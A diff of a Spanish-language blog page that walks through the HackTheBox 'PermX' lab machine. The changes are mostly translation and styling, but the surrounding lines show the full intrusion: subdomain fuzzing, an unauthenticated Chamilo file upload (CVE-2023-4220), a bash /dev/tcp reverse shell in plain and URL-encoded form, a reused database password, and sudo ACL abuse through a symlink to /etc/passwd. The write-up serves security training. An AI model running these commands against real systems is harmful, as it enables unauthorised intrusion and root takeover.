@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 
 <head>
   <title>
@@ -14,23 +14,23 @@
 
 <meta name="author" content="CeleroRKX">
 <meta name="description" content="Esta es una máquina de nivel Easy de la plataforma HackTheBox">
-<meta name="keywords" content="blog,developer,personal">
+<meta name="keywords" content="ciberseguridad, pentesting, hacking ético, HackTheBox, writeups, redes, eJPT, CWES">
 
 
 
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Permx Machine - HackTheBox">
-  <meta name="twitter:description" content="Esta es una máquina de nivel Easy de la plataforma HackTheBox">
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="Permx Machine - HackTheBox">
+	<meta name="twitter:description" content="Esta es una máquina de nivel Easy de la plataforma HackTheBox">
 
 <meta property="og:url" content="https://celero0.github.io/posts/permx/">
-  <meta property="og:site_name" content="Celero0 Blog">
-  <meta property="og:title" content="Permx Machine - HackTheBox">
-  <meta property="og:description" content="Esta es una máquina de nivel Easy de la plataforma HackTheBox">
-  <meta property="og:locale" content="en_us">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2026-02-14T16:44:24+00:00">
-    <meta property="article:modified_time" content="2026-02-14T16:44:24+00:00">
+	<meta property="og:site_name" content="Celero0 Blog">
+	<meta property="og:title" content="Permx Machine - HackTheBox">
+	<meta property="og:description" content="Esta es una máquina de nivel Easy de la plataforma HackTheBox">
+	<meta property="og:locale" content="es">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-02-14T16:44:24+00:00">
+		<meta property="article:modified_time" content="2026-02-14T16:44:24+00:00">
 
 
 
@@ -45,7 +45,7 @@
 
   
   
-  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="/css/coder.min.7931813641e92789c3090650cf34e053bf0a09b258f1e73ca3b5ba54e5c35b4f.css" integrity="sha256-eTGBNkHpJ4nDCQZQzzTgU78KCbJY8ec8o7W6VOXDW08=" crossorigin="anonymous" media="screen" />
 
 
 
@@ -55,13 +55,19 @@
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.min.7bae3723f236dac3024e7729da8f0d026ba33c06ce79d59f1f7a1811c81cd52c.css" integrity="sha256-e643I/I22sMCTncp2o8NAmujPAbOedWfH3oYEcgc1Sw=" crossorigin="anonymous" media="screen" />
   
 
 
 
  
 
+
+  
+  
+    
+    <link rel="stylesheet" href="/scss/custom.min.940f835c40977fce2ddd2fd8c55eb94de7e488a3ba45c0396d26445901b77774.css" integrity="sha256-lA&#43;DXECXf84t3S/YxV65TefkiKO6RcA5bSZEWQG3d3Q=" crossorigin="anonymous" media="screen" />
+  
 
 
 
@@ -90,7 +96,7 @@
 
 
 
-<body class="preload-transitions colorscheme-auto">
+<body class="preload-transitions colorscheme-dark">
   
 <div class="float-container">
     <a id="dark-mode-toggle" class="colorscheme-toggle">
@@ -117,6 +123,14 @@
           
             <li class="navigation-item">
               <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/labs/">Labs</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/projects/">Proyectos</a>
             </li>
           
             <li class="navigation-item">
@@ -148,12 +162,12 @@
             <span class="posted-on">
               <i class="fa-solid fa-calendar" aria-hidden="true"></i>
               <time datetime="2026-02-14T16:44:24Z">
-                February 14, 2026
+                14 de febrero de 2026
               </time>
             </span>
             <span class="reading-time">
               <i class="fa-solid fa-clock" aria-hidden="true"></i>
-              4-minute read
+              4 minutos de lectura.
             </span>
           </div>
           
@@ -187,9 +201,9 @@ Posteriormente, al revisar los permisos de <code>sudo</code>, encontramos un scr
   </a>
 </h1>
 <p>Realizamos un escaneo de los puertos, encontrando el puerto <code>80</code> abierto, que está corriendo el servicio <code>HTTP</code>, y el puerto <code>22</code>, que corre el servicio <code>SSH</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.129.8.242 -oG allPorts
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.129.8.242 -oG allPorts
 </span></span></code></pre></div><p>Realizamos un escaneo de versiones de los servicios</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80 -sCV 10.129.8.242 -oN portServices
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80 -sCV 10.129.8.242 -oN portServices
 </span></span></code></pre></div><p>Encontrando que el servicio HTTP nos muestra el dominio de la página web</p>
 <img src="/images/Pasted image 20260203175029.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto, lo agregaremos a nuestro <code>/etc/hosts</code></p>
@@ -204,7 +218,7 @@ Posteriormente, al revisar los permisos de <code>sudo</code>, encontramos un scr
 <p>Revisando la página web, no encontramos nada interesante</p>
 <img src="/images/Pasted image 20260203175200.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto realizaremos un fuzzing de subdominios, de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://permx.htb/ -H <span style="color:#a5d6ff">&#34;Host: FUZZ.permx.htb&#34;</span> -fl <span style="color:#a5d6ff">10</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://permx.htb/ -H <span style="color:#a5d6ff">&#34;Host: FUZZ.permx.htb&#34;</span> -fl <span style="color:#a5d6ff">10</span>
 </span></span></code></pre></div><p>Encontrando dos subdominios: <code>www</code>, <code>lms</code>.</p>
 <p>Por tanto los agregaremos a nuestro <code>/etc/hosts</code></p>
 <img src="/images/Pasted image 20260203175443.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -225,9 +239,9 @@ Posteriormente, al revisar los permisos de <code>sudo</code>, encontramos un scr
 <hr>
 <p>El <code>CVE-2023-4220</code> permite la subida de archivos sin necesitar autenticación, lo cual abre una vía potencial a ejecutar código malicioso mediante una webshell</p>
 <p>Para ello se manda una petición POST a la siguiente ruta</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>main/inc/lib/javascript/bigupload/inc/bigUpload.php?action<span style="color:#ff7b72;font-weight:bold">=</span>post-unsupported
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>main/inc/lib/javascript/bigupload/inc/bigUpload.php?action<span style="color:#ff7b72;font-weight:bold">=</span>post-unsupported
 </span></span></code></pre></div><p>Y agregamos el content type, y el boundary</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Content-Type: multipart/form-data;<span style="color:#79c0ff">boundary</span><span style="color:#ff7b72;font-weight:bold">=</span>---------------------------1234567890
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Content-Type: multipart/form-data;<span style="color:#79c0ff">boundary</span><span style="color:#ff7b72;font-weight:bold">=</span>---------------------------1234567890
 </span></span></code></pre></div><hr>
 <p>La petición queda como se muestra a continuación</p>
 <img src="/images/Pasted image 20260212184506.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -241,9 +255,9 @@ Posteriormente, al revisar los permisos de <code>sudo</code>, encontramos un scr
   </a>
 </h1>
 <p>Para obtener la shell, vamos a utilizar la siguiente reverse</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#a5d6ff">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.42/4443 0&gt;&amp;1&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#a5d6ff">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.42/4443 0&gt;&amp;1&#39;</span>
 </span></span></code></pre></div><p>y la pasamos a <code>URL-encoded</code>, quedando de la siguiente manera</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%34%32%2f%34%34%34%33%20%30%3e%26%31%27
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%34%32%2f%34%34%34%33%20%30%3e%26%31%27
 </span></span></code></pre></div><p>Lo enviamos y obtenemos la shell</p>
 <img src="/images/Pasted image 20260212184833.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h1 id="movimiento-lateral">
@@ -254,7 +268,7 @@ Posteriormente, al revisar los permisos de <code>sudo</code>, encontramos un scr
   </a>
 </h1>
 <p>Si volvemos al directorio principal de <code>Chamilo</code>, y buscamos la contraseña de la base de datos, con el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -r -i <span style="color:#a5d6ff">&#34;db_password&#34;</span> 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -r -i <span style="color:#a5d6ff">&#34;db_password&#34;</span> 2&gt;/dev/null
 </span></span></code></pre></div><p>Encontramos que el archivo <code>/app/config/configuration.php</code> muestra una contraseña</p>
 <img src="/images/Pasted image 20260212191924.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto lo vemos a más detalle y encontramos las credenciales de la base de datos <code>chamilo:03F6lY3uXAP2bkW8</code></p>
@@ -264,7 +278,7 @@ Posteriormente, al revisar los permisos de <code>sudo</code>, encontramos un scr
 <p>Por tanto probamos si se realiza reutilización de contraseñas en alguno de los usuarios, y vemos que el usuario <code>mtz</code>, utiliza la misma contraseña que la de la base de datos</p>
 <img src="/images/Pasted image 20260212192229.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por consecuencia, nos conectaremos por <code>SSH</code>, para tener una consola más estable</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh mtz@permx.htb
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh mtz@permx.htb
 </span></span></code></pre></div><img src="/images/Pasted image 20260212192319.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h1 id="escalada-de-privilegios">
   Escalada de privilegios
@@ -276,8 +290,8 @@ Posteriormente, al revisar los permisos de <code>sudo</code>, encontramos un scr
 <p>Si vemos qué comando podemos utilizar con <code>sudo</code>, vemos que tenemos permiso para ejecutar el script <code>/opt/acl.sh</code>, sin la necesidad de proporcionar contraseña.</p>
 <img src="/images/Pasted image 20260212192416.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Analizando el script, es el siguiente</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#!/bin/bash
-</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#!/bin/bash
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">[</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$#</span><span style="color:#a5d6ff">&#34;</span> -ne <span style="color:#a5d6ff">3</span> <span style="color:#ff7b72;font-weight:bold">]</span>; <span style="color:#ff7b72">then</span>
 </span></span><span style="display:flex;"><span>    /usr/bin/echo <span style="color:#a5d6ff">&#34;Usage: </span><span style="color:#79c0ff">$0</span><span style="color:#a5d6ff"> user perm file&#34;</span>
 </span></span><span style="display:flex;"><span>    exit <span style="color:#a5d6ff">1</span>
@@ -309,9 +323,9 @@ Posteriormente, al revisar los permisos de <code>sudo</code>, encontramos un scr
   </a>
 </h2>
 <p>Para ello crearemos un enlace simbólico de <code>/etc/passwd</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ln -s /etc/passwd /home/mtz/passwd
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ln -s /etc/passwd /home/mtz/passwd
 </span></span></code></pre></div><p>Luego ejecutaremos el script de la siguiente manera</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /opt/acl.sh mtz rwx /home/mtz/passwd
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /opt/acl.sh mtz rwx /home/mtz/passwd
 </span></span></code></pre></div><p>Ahora editamos el <code>/etc/passwd</code>, quitando la <code>x</code> que está justo después de <code>root</code></p>
 <img src="/images/Pasted image 20260212201213.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Quedando así como se muestra a continuación</p>
@@ -347,13 +361,13 @@ Posteriormente, al revisar los permisos de <code>sudo</code>, encontramos un scr
   <section class="container">
     ©
     
-      2019 -
+      2025 -
     
     2026
      CeleroRKX 
     ·
     
-    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    Desarrollado por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
     
   </section>
 </footer>
@@ -367,6 +381,11 @@ Posteriormente, al revisar los permisos de <code>sudo</code>, encontramos un scr
   <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
   
 
+  
+  
+  
+  <script src="/js/gestures.min.6cbd91590032e7f15addfe0af40403b55908afeef98fe1be098e196656366619.js" integrity="sha256-bL2RWQAy5/Fa3f4K9AQDtVkIr&#43;75j&#43;G&#43;CY4ZZlY2Zhk="></script>
+  
   
 
   
